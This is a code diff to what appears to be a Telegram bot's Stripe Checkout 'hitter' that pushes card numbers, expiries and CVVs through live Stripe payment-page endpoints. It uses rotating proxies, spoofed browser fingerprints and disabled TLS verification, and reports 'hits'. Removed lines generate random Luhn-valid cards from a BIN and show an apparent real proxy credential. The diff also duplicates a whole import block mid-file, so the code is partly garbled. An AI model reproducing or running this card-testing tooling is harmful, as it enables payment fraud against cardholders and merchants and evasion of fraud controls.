@@ -4260,34 +4260,60 @@ async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: s
         if len(clean_response) > 100:
             clean_response = clean_response[:97] + "..."
 
-        # Resolve the country flag (fall back to a name lookup, then 🌍).
-        flag_emoji = "🌍"
-        try:
-            if country_code and str(country_code).upper() not in ("N/A", "XX", ""):
-                flag_emoji = get_flag_emoji_from_country_code(country_code)
-            if flag_emoji == "🌍" and country and str(country).upper() != "N/A":
-                _name_flags = {
-                    'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UNITED STATES OF AMERICA': '🇺🇸',
-                    'UK': '🇬🇧', 'UNITED KINGDOM': '🇬🇧', 'CANADA': '🇨🇦',
-                    'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪',
-                    'SPAIN': '🇪🇸', 'GERMANY': '🇩🇪', 'FRANCE': '🇫🇷',
-                    'ITALY': '🇮🇹', 'NETHERLANDS': '🇳🇱', 'BRAZIL': '🇧🇷',
-                    'MEXICO': '🇲🇽', 'JAPAN': '🇯🇵', 'CHINA': '🇨🇳',
-                    'PHILIPPINES': '🇵🇭', 'NIGERIA': '🇳🇬', 'SOUTH AFRICA': '🇿🇦',
-                }
-                flag_emoji = _name_flags.get(str(country).upper().strip(), flag_emoji)
-        except Exception:
-            flag_emoji = "🌍"
-
         # Keep exactly ONE flag: BIN APIs often return the country already
-        # prefixed with its flag ("🇮🇹 ITALY"), which used to render as
-        # "🇺🇸 🇮🇹 ITALY". Strip any flag chars already in the name.
+        # prefixed with its flag ("🇮🇳 INDIA"), which used to render as
+        # "🇺🇸 🇮🇳 INDIA". Strip any flag chars already in the name first.
         country_clean = str(country or "").strip()
         for _fc in ("🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"):
             country_clean = country_clean.replace(_fc, "")
         country_clean = re.sub(r"\s+", " ", country_clean).strip()
-        if not country_clean or country_clean.upper() in ("N/A", "UNKNOWN"):
+        if not country_clean or country_clean.upper() in ("N/A", "UNKNOWN", "UNK"):
             country_clean = country_clean or "Unknown"
+
+        # Resolve the flag from the NAME first — the name is authoritative.
+        # Some BIN providers return a country code that disagrees with the
+        # name (code "US" + name "INDIA") and the code used to win, which is
+        # exactly how "🇺🇸 INDIA" appeared. The code is only a fallback now.
+        _name_flags = {
+            'UNITED STATES OF AMERICA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'USA': '🇺🇸',
+            'UNITED KINGDOM': '🇬🇧', 'UK': '🇬🇧', 'GREAT BRITAIN': '🇬🇧',
+            'UNITED ARAB EMIRATES': '🇦🇪', 'UAE': '🇦🇪', 'SAUDI ARABIA': '🇸🇦',
+            'SOUTH KOREA': '🇰🇷', 'KOREA': '🇰🇷', 'HONG KONG': '🇭🇰',
+            'SOUTH AFRICA': '🇿🇦', 'NEW ZEALAND': '🇳🇿', 'SRI LANKA': '🇱🇰',
+            'CANADA': '🇨🇦', 'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳',
+            'SPAIN': '🇪🇸', 'GERMANY': '🇩🇪', 'FRANCE': '🇫🇷',
+            'ITALY': '🇮🇹', 'NETHERLANDS': '🇳🇱', 'BELGIUM': '🇧🇪',
+            'SWITZERLAND': '🇨🇭', 'SWEDEN': '🇸🇪', 'NORWAY': '🇳🇴',
+            'DENMARK': '🇩🇰', 'FINLAND': '🇫🇮', 'POLAND': '🇵🇱',
+            'PORTUGAL': '🇵🇹', 'IRELAND': '🇮🇪', 'AUSTRIA': '🇦🇹',
+            'GREECE': '🇬🇷', 'TURKEY': '🇹🇷', 'RUSSIA': '🇷🇺',
+            'UKRAINE': '🇺🇦', 'CZECH': '🇨🇿', 'ROMANIA': '🇷🇴',
+            'HUNGARY': '🇭🇺', 'BRAZIL': '🇧🇷', 'MEXICO': '🇲🇽',
+            'ARGENTINA': '🇦🇷', 'CHILE': '🇨🇱', 'COLOMBIA': '🇨🇴',
+            'PERU': '🇵🇪', 'ECUADOR': '🇪🇨', 'CHINA': '🇨🇳',
+            'JAPAN': '🇯🇵', 'TAIWAN': '🇹🇼', 'SINGAPORE': '🇸🇬',
+            'MALAYSIA': '🇲🇾', 'INDONESIA': '🇮🇩', 'THAILAND': '🇹🇭',
+            'VIETNAM': '🇻🇳', 'PHILIPPINES': '🇵🇭', 'PAKISTAN': '🇵🇰',
+            'BANGLADESH': '🇧🇩', 'NEPAL': '🇳🇵', 'NIGERIA': '🇳🇬',
+            'GHANA': '🇬🇭', 'KENYA': '🇰🇪', 'EGYPT': '🇪🇬',
+            'MOROCCO': '🇲🇦', 'ISRAEL': '🇮🇱', 'QATAR': '🇶🇦',
+            'KUWAIT': '🇰🇼', 'OMAN': '🇴🇲', 'BAHRAIN': '🇧🇭',
+            'JORDAN': '🇯🇴', 'LEBANON': '🇱🇧',
+        }
+        flag_emoji = "🌍"
+        try:
+            _cname = country_clean.upper()
+            # Longest key first so "UNITED STATES" wins over "USA"-style keys
+            for _name in sorted(_name_flags, key=len, reverse=True):
+                if _name in _cname:
+                    flag_emoji = _name_flags[_name]
+                    break
+            if flag_emoji == "🌍":
+                _ccode = str(country_code or "").strip().upper()
+                if _ccode and _ccode not in ("N/A", "XX", "UNKNOWN", ""):
+                    flag_emoji = get_flag_emoji_from_country_code(_ccode)
+        except Exception:
+            flag_emoji = "🌍"
 
         diamond_emoji = premium_emoji("5427168083074628963", "💎")
 
@@ -17448,7 +17474,7 @@ def _stco_env_flag(name: str, default: str = "1") -> bool:
 
 
 STCO_DEBUG = _stco_env_flag("STCO_DEBUG", "1")
-STCO_TRACE_IN_REPLY = _stco_env_flag("STCO_TRACE_IN_REPLY", "1")
+STCO_TRACE_IN_REPLY = _stco_env_flag("STCO_TRACE_IN_REPLY", "0")
 try:
     STCO_FAST_EXIT_SECONDS = float(os.getenv("STCO_FAST_EXIT_SECONDS", "3"))
 except (TypeError, ValueError):
@@ -17883,75 +17909,129 @@ class CurlCffiAsyncClient:
         return CurlCffiResponse(resp)
 
 
-class STCOTLSBypass:
-    """TLS bypass + per-proxy connection pooling for /stco (curl_cffi Chrome)."""
+import ssl
+import certifi
+import os
+import warnings
+import urllib3
+import re
+import json
+import time
+import uuid
+import random
+import asyncio
+import base64
+import urllib.parse
+from typing import Dict, Optional, Tuple, List
+import httpx
+from faker import Faker
+from datetime import datetime
 
+# Suppress SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings("ignore", category=Warning)
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+
+# ============ TLS BYPASS FOR STCO ============
+
+import ssl
+import certifi
+import os
+import warnings
+import urllib3
+import re
+import json
+import time
+import uuid
+import random
+import asyncio
+import base64
+import urllib.parse
+from typing import Dict, Optional, Tuple, List
+import httpx
+from faker import Faker
+from datetime import datetime
+
+# Suppress SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings("ignore", category=Warning)
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+
+# ============ TLS BYPASS FOR STCO ============
+
+class STCOTLSBypass:
+    """Handle TLS bypass and connection pooling for /stco"""
+    
     def __init__(self):
         self.ssl_context = None
         self.session_client = None
-        self._clients: Dict[str, CurlCffiAsyncClient] = {}
         self._client_lock = asyncio.Lock()
-
+        
     def get_ssl_context(self) -> ssl.SSLContext:
-        """Kept for backward compatibility; curl_cffi handles TLS itself."""
+        """Get SSL context with TLS bypass"""
         if self.ssl_context is None:
             try:
                 self.ssl_context = ssl.create_default_context(
                     ssl.Purpose.SERVER_AUTH,
                     cafile=certifi.where()
                 )
-            except Exception:
+            except:
                 self.ssl_context = ssl.create_default_context()
-
+                self.ssl_context.check_hostname = False
+                self.ssl_context.verify_mode = ssl.CERT_NONE
+            
+            # TLS bypass - disable checks
             self.ssl_context.check_hostname = False
             self.ssl_context.verify_mode = ssl.CERT_NONE
-
+            
+            # Force TLS 1.2 or 1.3
             try:
                 self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
                 self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
-            except Exception:
+            except:
                 pass
-
+            
+            # Set ciphers for better compatibility
             try:
                 self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
-            except Exception:
+            except:
                 pass
-
+            
         return self.ssl_context
-
-    async def get_client(self, proxy: str = None) -> CurlCffiAsyncClient:
-        """
-        Return a Chrome-impersonated client for the given proxy.
-
-        A separate client is pooled per proxy (keyed by the normalised proxy
-        URL) so concurrent cards never share the wrong exit IP.
-        """
-        proxy_url = format_proxy_stco(proxy) if proxy else None
-        pool_key = proxy_url or "__direct__"
-
+    
+    async def get_client(self, proxy: str = None) -> httpx.AsyncClient:
+        """Get HTTPX client with TLS bypass and connection pooling"""
+        
         async with self._client_lock:
-            client = self._clients.get(pool_key)
-            if client is None or client.is_closed:
-                client = CurlCffiAsyncClient(
-                    impersonate=STCO_IMPERSONATE,
-                    proxy=proxy_url,
-                    timeout=60.0,
-                )
-                self._clients[pool_key] = client
-            self.session_client = client
-            return client
-
+            if self.session_client is None or self.session_client.is_closed:
+                ssl_context = self.get_ssl_context()
+                
+                client_kwargs = {
+                    'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
+                    'verify': ssl_context,
+                    'follow_redirects': True,
+                    'limits': httpx.Limits(
+                        max_keepalive_connections=20,
+                        max_connections=50,
+                        keepalive_expiry=60
+                    ),
+                    'http2': True,
+                }
+                
+                if proxy:
+                    proxy_url = format_proxy_stco(proxy)
+                    if proxy_url:
+                        client_kwargs['proxy'] = proxy_url
+                
+                self.session_client = httpx.AsyncClient(**client_kwargs)
+            
+            return self.session_client
+    
     async def close(self):
-        """Close every pooled client."""
-        async with self._client_lock:
-            clients = list(self._clients.values())
-            self._clients.clear()
+        """Close the session client"""
+        if self.session_client:
+            await self.session_client.aclose()
             self.session_client = None
-        for client in clients:
-            try:
-                await client.aclose()
-            except Exception:
-                pass
 
 # Create global instance
 stco_tls = STCOTLSBypass()
@@ -18035,119 +18115,29 @@ def decode_stripe_url_stco(url: str) -> Dict[str, Optional[str]]:
     return result
 
 def format_proxy_stco(proxy: str) -> Optional[str]:
-    """
-    Format proxy for Stripe Checkout Hitter.
-    Supports multiple formats:
-    - user:pass@host:port
-    - host:port:user:pass (like p104.instantproxies.com:8901:7274:JjoY3iUMaAGZ)
-    - user:pass:host:port
-    - host:port
-    """
     if not proxy:
         return None
-    
     proxy = proxy.strip()
-    
-    # If it already has a protocol, return as-is
-    if proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
+    if '://' in proxy:
         return proxy
-    
-    # ============ HANDLE host:port:user:pass format ============
-    # Example: p104.instantproxies.com:8901:7274:JjoY3iUMaAGZ
     parts = proxy.split(':')
-    
     if len(parts) == 4:
-        # ============ FIXED: Detect which format it is ============
-        # Format 1: host:port:user:pass (host has dots, port is numeric)
-        # Example: p104.instantproxies.com:8901:7274:JjoY3iUMaAGZ
-        if '.' in parts[0] and parts[1].isdigit():
-            host, port, user, password = parts
-            # User is usually numeric or alphanumeric, but it's NOT the port
-            return f"http://{user}:{password}@{host}:{port}"
-        
-        # Format 2: user:pass:host:port (last part is port)
-        # Example: user:pass:host:port
-        elif parts[3].isdigit():
-            user, password, host, port = parts
-            return f"http://{user}:{password}@{host}:{port}"
-        
-        # Format 3: host:port:user:pass but host doesn't have dots
-        # Try to detect by checking which part looks like a host
-        else:
-            # Check if any part looks like a host (contains dots)
-            host_index = -1
-            for i, part in enumerate(parts):
-                if '.' in part:
-                    host_index = i
-                    break
-            
-            if host_index == 0:
-                # host:port:user:pass
-                host, port, user, password = parts
-                return f"http://{user}:{password}@{host}:{port}"
-            elif host_index == 2:
-                # user:pass:host:port
-                user, password, host, port = parts
-                return f"http://{user}:{password}@{host}:{port}"
-            else:
-                # Default: assume host:port:user:pass
-                host, port, user, password = parts
-                return f"http://{user}:{password}@{host}:{port}"
-    
-    # ============ HANDLE user:pass@host:port format ============
-    if '@' in proxy:
-        if not proxy.startswith(('http://', 'https://')):
-            return f"http://{proxy}"
-        return proxy
-    
-    # ============ HANDLE host:port only ============
-    if len(parts) == 2 and parts[1].isdigit():
-        return f"http://{proxy}"
-    
-    # ============ HANDLE host:port:user:pass but with different separator ============
-    # Try regex to extract
-    import re
-    match = re.search(r'([a-zA-Z0-9\.-]+):(\d+):([a-zA-Z0-9]+):([a-zA-Z0-9]+)', proxy)
-    if match:
-        host, port, user, password = match.groups()
+        user, password, host, port = parts
         return f"http://{user}:{password}@{host}:{port}"
-    
-    # If we can't parse it, try the global formatter
-    formatted = format_proxy(proxy)
-    if formatted:
-        return formatted
-    
-    print(f"⚠️ Could not format proxy: {proxy[:50]}...")
+    if len(parts) == 2:
+        return f"http://{proxy}"
     return None
 
 def mask_proxy_stco(proxy: str) -> str:
-    """Mask proxy for display - safe version"""
     if not proxy:
         return "None"
     try:
         if '@' in proxy:
             parts = proxy.split('@')
-            auth_part = parts[0]
-            host_part = parts[1] if len(parts) > 1 else ""
-            # Mask auth part
-            if '://' in auth_part:
-                protocol = auth_part.split('://')[0]
-                return f"{protocol}://***@{host_part}"
-            else:
-                return f"***@{host_part}"
-        elif ':' in proxy:
-            parts = proxy.split(':')
-            if len(parts) >= 4:
-                # host:port:user:pass format
-                host = parts[0]
-                port = parts[1]
-                return f"{host}:{port}:***:***"
-            elif len(parts) >= 2:
-                # Simple host:port
-                return f"{parts[0]}:{parts[1]}"
+            return f"***@{parts[1]}"
+        return "***.***.***.***:***"
     except:
-        pass
-    return "Proxy (masked)"
+        return "Proxy (masked)"
 
 def get_currency_symbol_stco(currency: str) -> str:
     symbols = {
@@ -18203,105 +18193,18 @@ def parse_card_stco(line: str) -> Optional[Dict]:
         return None
     return {"cc": cc, "month": month, "year": year, "cvv": cvv}
 
-
-# ============ /stco BIN MODE — RANDOM CARD GENERATION ============
-# /stco accepts either full cards (cc|mm|yy|cvv) or a numeric BIN/prefix. When a
-# BIN is given, the remaining PAN digits, the expiry and the CVV are
-# generated randomly and STCO_BIN_GEN_COUNT cards are checked.
-STCO_BIN_GEN_COUNT = 10
-
-
-def _luhn_check_digit_stco(partial: str) -> str:
-    """Return the Luhn check digit that completes ``partial``."""
-    total = 0
-    for i, ch in enumerate(reversed(partial)):
-        d = int(ch)
-        if i % 2 == 0:
-            d *= 2
-            if d > 9:
-                d -= 9
-        total += d
-    return str((10 - (total % 10)) % 10)
-
-
-def generate_cards_from_bin_stco(bin_str: str,
-                                 count: int = STCO_BIN_GEN_COUNT) -> list:
-    """Generate ``count`` random, Luhn-valid cards from a BIN.
-
-    The BIN is kept as the leading digits; the rest of the PAN, the expiry
-    month/year and the CVV are randomised. Amex BINs (34/37) produce a
-    15-digit PAN with a 4-digit CVV, everything else 16-digit with 3.
-    """
-    bin_digits = re.sub(r'\D', '', bin_str or '')
-    if len(bin_digits) < 6:
-        return []
-
-    is_amex = bin_digits[:2] in ('34', '37')
-    pan_len = 15 if is_amex else 16
-    cvv_len = 4 if is_amex else 3
-
-    cards = []
-    for _ in range(max(1, int(count))):
-        if len(bin_digits) >= pan_len - 1:
-            partial = bin_digits[:pan_len - 1]
-        else:
-            fill = pan_len - 1 - len(bin_digits)
-            partial = bin_digits + ''.join(
-                random.choice('0123456789') for _ in range(fill)
-            )
-        cc = partial + _luhn_check_digit_stco(partial)
-        month = f"{random.randint(1, 12):02d}"
-        year = f"{(datetime.now().year + random.randint(1, 5)) % 100:02d}"
-        cvv = ''.join(random.choice('0123456789') for _ in range(cvv_len))
-        cards.append({"cc": cc, "month": month, "year": year, "cvv": cvv})
-
-    return cards
-
-
-def get_stripe_user_proxy(user_id: int) -> Optional[str]:
-    """Get a working proxy for the user - with better error handling"""
-    try:
-        proxies = load_stripe_proxies()
-        user_proxies = proxies.get(str(user_id), [])
-        
-        if not user_proxies:
-            # Check if there's a global proxy pool
-            if global_proxy_pool.enabled and global_proxy_pool.proxies:
-                # Get a proxy from global pool
-                for proxy in global_proxy_pool.proxies:
-                    # Validate proxy format
-                    formatted = format_proxy_stco(proxy)
-                    if formatted:
-                        return proxy
-            return None
-        
-        if isinstance(user_proxies, list):
-            # Filter out invalid proxies
-            valid_proxies = []
-            for p in user_proxies:
-                # Quick validation - check if it has a colon and looks like a proxy
-                if ':' in p:
-                    # Try to format it to validate
-                    formatted = format_proxy_stco(p)
-                    if formatted:
-                        valid_proxies.append(p)
-            
-            if valid_proxies:
-                return random.choice(valid_proxies)
-            
-            # If no valid proxies, try the first one anyway
-            return user_proxies[0] if user_proxies else None
-        
-        return user_proxies if user_proxies else None
-        
-    except Exception as e:
-        print(f"⚠️ Error getting user proxy: {e}")
-        return None
+def get_stripe_user_proxy(user_id: int) -> str:
+    """Get user's proxy for Stripe hitter"""
+    proxies = load_stripe_proxies_stco()
+    user_proxies = proxies.get(str(user_id), [])
+    if user_proxies:
+        return random.choice(user_proxies) if isinstance(user_proxies, list) else user_proxies
+    return None
 
 def load_stripe_proxies_stco() -> dict:
-    if os.path.exists(STRIPE_HITTER_PROXY_FILE):
+    if os.path.exists("stripe_hitter_proxies.json"):
         try:
-            with open(STRIPE_HITTER_PROXY_FILE, 'r') as f:
+            with open("stripe_hitter_proxies.json", 'r') as f:
                 return json.load(f)
         except:
             return {}
@@ -18483,7 +18386,7 @@ async def get_checkout_session_stco(cs_id: str, pk: str, proxy: str = None) -> D
         print(f"❌ Error getting session: {e}")
         return {}
 
-
+# ============ CHARGE SINGLE CARD ============
 
 # ============ UPDATED CHARGE FUNCTION - FIXED EMAIL ============
 
@@ -18509,7 +18412,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             result["status"] = "ERROR"
             result["response"] = "Invalid card format"
             result["time"] = round(time.perf_counter() - start, 2)
-            debug_print(1, f"❌ Invalid card format: {card}")
+            print(f"❌ Invalid card format: {card}")
             return result
     elif isinstance(card, dict):
         result["card"] = f"{card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}"
@@ -18517,56 +18420,54 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
         result["status"] = "ERROR"
         result["response"] = "Invalid card type"
         result["time"] = round(time.perf_counter() - start, 2)
-        debug_print(1, f"❌ Invalid card type: {type(card)}")
+        print(f"❌ Invalid card type: {type(card)}")
         return result
 
     pk = checkout_data.get("pk")
     cs = checkout_data.get("cs")
-    raw_url = checkout_data.get("raw_url")
-    display_info = checkout_data.get("display_info", {})
 
     if not pk or not cs:
         result["status"] = "FAILED"
         result["response"] = "No checkout data (missing PK or CS)"
         result["time"] = round(time.perf_counter() - start, 2)
-        debug_print(1, f"❌ Missing PK or CS")
+        print(f"❌ Missing PK or CS")
         return result
 
-    # Format proxy
-    proxy_url = None
-    if proxy_str:
-        proxy_url = format_proxy_stco(proxy_str)
-        if proxy_url:
-            # Validate proxy format
-            try:
-                clean_proxy = proxy_url.replace('http://', '').replace('https://', '')
-                if '@' in clean_proxy:
-                    host_port = clean_proxy.split('@')[1]
-                else:
-                    host_port = clean_proxy
-                if ':' in host_port:
-                    host, port = host_port.rsplit(':', 1)
-                    int(port)  # Validate port is a number
-                    debug_print(2, f"🔌 Using proxy: {mask_proxy(proxy_url)}")
-                else:
-                    debug_print(1, f"⚠️ Invalid proxy format, using direct connection")
-                    proxy_url = None
-            except (ValueError, IndexError) as e:
-                debug_print(1, f"⚠️ Invalid proxy: {e}, using direct connection")
-                proxy_url = None
-        else:
-            debug_print(1, f"⚠️ Could not format proxy, using direct connection")
-            proxy_url = None
-    else:
-        debug_print(2, f"🔌 No proxy - direct connection")
-
-    # Get session email
+    # ============ USE SESSION EMAIL INSTEAD OF GENERATING NEW ============
     customer_email = session_data.get("customer_email", "")
+    
+    # If no email in session, use a fallback
     if not customer_email:
         customer_email = "user@gmail.com"
         print(f"⚠️ No email in session, using fallback: {customer_email}")
     else:
         print(f"📧 Using session email: {customer_email}")
+
+    # Generate name from email or use generic
+    if '@' in customer_email:
+        name_part = customer_email.split('@')[0]
+        name_parts = name_part.replace('.', ' ').replace('_', ' ').split()
+        if len(name_parts) >= 2:
+            first_name = name_parts[0].capitalize()
+            last_name = name_parts[1].capitalize()
+        else:
+            first_name = name_part[:8].capitalize() if len(name_part) > 4 else "User"
+            last_name = "Customer"
+    else:
+        first_name = "Test"
+        last_name = "User"
+    
+    full_name = f"{first_name} {last_name}"
+    print(f"👤 Customer: {full_name}")
+    print(f"📧 Email: {customer_email}")
+
+    # ============ TLS BYPASS CLIENT ============
+    client = await stco_tls.get_client(proxy_str)
+    
+    if proxy_str:
+        print(f"🔌 Using proxy: {mask_proxy_stco(proxy_str)}")
+    else:
+        print(f"🔌 No proxy - direct connection")
 
     for attempt in range(max_retries + 1):
         attempt_start = time.perf_counter()
@@ -18578,261 +18479,169 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             year = card.get('year', '')
             cvv = card.get('cvv', '')
             
-            debug_print(2, f"🔄 Attempt {attempt + 1}/{max_retries + 1}")
-            debug_print(3, f"💳 Card: {cc[:6]}****** | {month}/{year} | CVV: {cvv}")
+            # Format year
+            if len(year) == 2:
+                year_full = f"20{year}"
+            else:
+                year_full = year
             
-            fp = rand_profile()
-            guid = generate_guid()
-            muid = generate_muid()
-            sid = generate_sid()
-            sess_id = generate_client_session_id()
-            elem_sess = generate_elements_session_id()
-            config_id = generate_elements_config_id()
-
-            debug_print(4, f"🔐 Fingerprint: {fp['chrome_full']} | {fp['platform']}")
-
+            print(f"🔄 Attempt {attempt + 1}/{max_retries + 1}")
+            print(f"💳 Card: {cc[:6]}****** | {month}/{year_full} | CVV: {cvv}")
+            
+            fp = {
+                'ua': get_random_user_agent_stco(),
+                'stripe_js': get_stripe_js_version_stco(),
+            }
+            
+            guid = generate_guid_stco()
+            muid = generate_muid_stco()
+            sid = generate_sid_stco()
+            sess_id = generate_client_session_id_stco()
+            elem_sess = generate_elements_session_id_stco()
+            
             # ============ GET FRESH INIT DATA ============
-            debug_print(3, f"📡 Getting fresh init data...")
-            _stco_mark("init_fetch_start", f"attempt {attempt + 1}")
-            _init_t0 = time.perf_counter()
-
-            fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(cs, pk, proxy_url)
-
-            _init_ms = (time.perf_counter() - _init_t0) * 1000.0
-            _stco_mark("init_fetch_done",
-                       f"attempt {attempt + 1} → {_stco_fmt_ms(_init_ms)}, "
-                       f"{'ok' if fresh_init_data else 'FAILED'}")
-
-            # If fresh init fails, try to re-decode from URL
-            if fresh_init_data is None and raw_url:
-                debug_print(3, f"🔄 Fresh init failed, re-decoding from raw URL...")
-                fresh_checkout = await get_checkout_info_stripe(raw_url)
-                if fresh_checkout and fresh_checkout.get("is_valid"):
-                    fresh_pk = fresh_checkout.get("pk")
-                    fresh_cs = fresh_checkout.get("cs")
-                    if fresh_pk and fresh_cs:
-                        fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(fresh_cs, fresh_pk, proxy_url)
+            print(f"📡 Getting fresh init data...")
             
-            # Check if fresh_init_data is None
-            if fresh_init_data is None:
-                debug_print(1, f"❌ Failed to get fresh init data on attempt {attempt + 1}")
-                attempt_data["status"] = "failed"
-                attempt_data["error"] = "Fresh init failed"
-                result["attempts"].append(attempt_data)
+            try:
+                init_url = f"https://api.stripe.com/v1/payment_pages/{cs}/init"
+                init_body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
                 
+                init_response = await client.post(
+                    init_url,
+                    data=init_body,
+                    headers={
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Origin': 'https://checkout.stripe.com',
+                        'Referer': 'https://checkout.stripe.com/',
+                        'User-Agent': fp['ua'],
+                    }
+                )
+                
+                if init_response.status_code != 200:
+                    print(f"❌ Init request failed: {init_response.status_code}")
+                    attempt_data["status"] = "failed"
+                    attempt_data["error"] = f"Init failed: {init_response.status_code}"
+                    result["attempts"].append(attempt_data)
+                    if attempt < max_retries:
+                        await asyncio.sleep(2)
+                        continue
+                    result["status"] = "SESSION_ERROR"
+                    result["response"] = "Failed to initialize Stripe Checkout session"
+                    result["time"] = round(time.perf_counter() - start, 2)
+                    return result
+                
+                init_data = init_response.json()
+                
+                if "error" in init_data:
+                    print(f"❌ Init error: {init_data['error']}")
+                    attempt_data["status"] = "failed"
+                    attempt_data["error"] = init_data['error']
+                    result["attempts"].append(attempt_data)
+                    if attempt < max_retries:
+                        await asyncio.sleep(2)
+                        continue
+                    result["status"] = "SESSION_ERROR"
+                    result["response"] = init_data['error']
+                    result["time"] = round(time.perf_counter() - start, 2)
+                    return result
+                    
+            except Exception as e:
+                print(f"❌ Init exception: {e}")
+                attempt_data["status"] = "failed"
+                attempt_data["error"] = str(e)
+                result["attempts"].append(attempt_data)
                 if attempt < max_retries:
-                    # If proxy error, try without proxy
-                    if proxy_url and "proxy" in str(init_response or "").lower():
-                        debug_print(3, f"🔄 Proxy error, retrying without proxy...")
-                        proxy_url = None
-                    else:
-                        debug_print(3, f"⏳ Waiting 2s before retry...")
                     await asyncio.sleep(2)
                     continue
                 result["status"] = "SESSION_ERROR"
-                result["response"] = "Failed to initialize Stripe Checkout session after retries"
+                result["response"] = str(e)[:100]
                 result["time"] = round(time.perf_counter() - start, 2)
-                debug_print(1, f"❌ {result['response']}")
                 return result
             
-            pk = fresh_pk
-            cs = fresh_cs
-            init_data = fresh_init_data
-            
-            debug_print(3, f"✅ Fresh init data obtained")
-            
-            # ============ GET THE CORRECT AMOUNT ============
-            lig = init_data.get("line_item_group") or {}
-            inv = init_data.get("invoice") or {}
-            subscription = init_data.get("subscription") or {}
-            subscription_data = init_data.get("subscription_data") or {}
-            
-            total = 0
-            subtotal = 0
-            
-            if lig:
-                total = lig.get("total", 0)
-                subtotal = lig.get("subtotal", 0)
-                debug_print(3, f"💰 Total from line_item_group: {total/100:.2f} {lig.get('currency', 'USD')}")
-            elif inv:
-                total = inv.get("total", 0)
-                subtotal = inv.get("subtotal", 0)
-                debug_print(3, f"💰 Total from invoice: {total/100:.2f} {inv.get('currency', 'USD')}")
-            elif subscription:
-                total = subscription.get("amount", 0)
-                subtotal = total
-                debug_print(3, f"💰 Total from subscription: {total/100:.2f}")
-            elif subscription_data:
-                total = subscription_data.get("amount", 0)
-                subtotal = total
-                debug_print(3, f"💰 Total from subscription_data: {total/100:.2f}")
-            else:
-                pi = init_data.get("payment_intent") or {}
-                total = pi.get("amount", 0)
-                subtotal = total
-                debug_print(3, f"💰 Total from payment_intent: {total/100:.2f}")
-            
-            # If still 0, try to get from session data
-            if total == 0:
-                total = session_data.get("amount", 0)
-                subtotal = total
-                debug_print(3, f"💰 Total from session_data: {total/100:.2f}")
-            
-            # If still 0, try from display info
-            if total == 0 and display_info:
-                price = display_info.get("price", 0)
-                if price:
-                    total = int(price * 100)
-                    subtotal = total
-                    debug_print(3, f"💰 Total from display_info: {total/100:.2f}")
-            
-            # For subscriptions, check the plan amount
-            if init_data.get("mode") == "subscription":
-                sub_plan = init_data.get("subscription_data", {}).get("plan", {})
-                if sub_plan and sub_plan.get("amount"):
-                    total = sub_plan.get("amount", total)
-                    subtotal = total
-                    debug_print(3, f"💰 Total from subscription plan: {total/100:.2f}")
-
-            # Get checksum
             checksum = init_data.get("init_checksum", "")
-
-            # Generate billing details
-            billing = generate_fresh_billing_details()
-            
-            # Use session email
-            billing['email'] = customer_email
-            
-            # Generate name from email
-            if '@' in customer_email:
-                name_part = customer_email.split('@')[0]
-                name_parts = name_part.replace('.', ' ').replace('_', ' ').split()
-                if len(name_parts) >= 2:
-                    first_name = name_parts[0].capitalize()
-                    last_name = name_parts[1].capitalize()
-                else:
-                    first_name = name_part[:8].capitalize() if len(name_part) > 4 else "User"
-                    last_name = "Customer"
-            else:
-                first_name = "Test"
-                last_name = "User"
-            
-            billing['full_name'] = f"{first_name} {last_name}"
-            
-            debug_print(3, f"👤 Customer: {billing['full_name']}")
-            debug_print(3, f"📧 Email: {billing['email']}")
+            total = init_data.get("line_item_group", {}).get("total", 0)
 
             # ============ BUILD CONFIRM PARAMS ============
+            # IMPORTANT: Use the session's pre-set email
             confirm_params = [
                 ("eid", "NA"),
                 ("payment_method_data[type]", "card"),
                 ("payment_method_data[card][number]", cc),
                 ("payment_method_data[card][cvc]", cvv),
                 ("payment_method_data[card][exp_month]", month),
-                ("payment_method_data[card][exp_year]", year),
+                ("payment_method_data[card][exp_year]", year_full),
                 ("payment_method_data[allow_redisplay]", "unspecified"),
-                ("payment_method_data[billing_details][name]", billing['full_name']),
-                ("payment_method_data[billing_details][email]", billing['email']),
-                ("payment_method_data[billing_details][address][country]", billing['country']),
-                ("payment_method_data[billing_details][address][line1]", billing['address']),
-                ("payment_method_data[billing_details][address][city]", billing['city']),
-                ("payment_method_data[billing_details][address][state]", billing['state']),
-                ("payment_method_data[billing_details][address][postal_code]", billing['zip_code']),
+                ("payment_method_data[billing_details][name]", full_name),
+                ("payment_method_data[billing_details][email]", customer_email),  # USE SESSION EMAIL
+                ("payment_method_data[billing_details][address][country]", "US"),
+                ("payment_method_data[billing_details][address][postal_code]", "10010"),
                 ("payment_method_data[pasted_fields]", "number"),
-                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; payment-element"),
-                ("payment_method_data[referrer]", "https://merchant.example.com"),
+                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; checkout"),
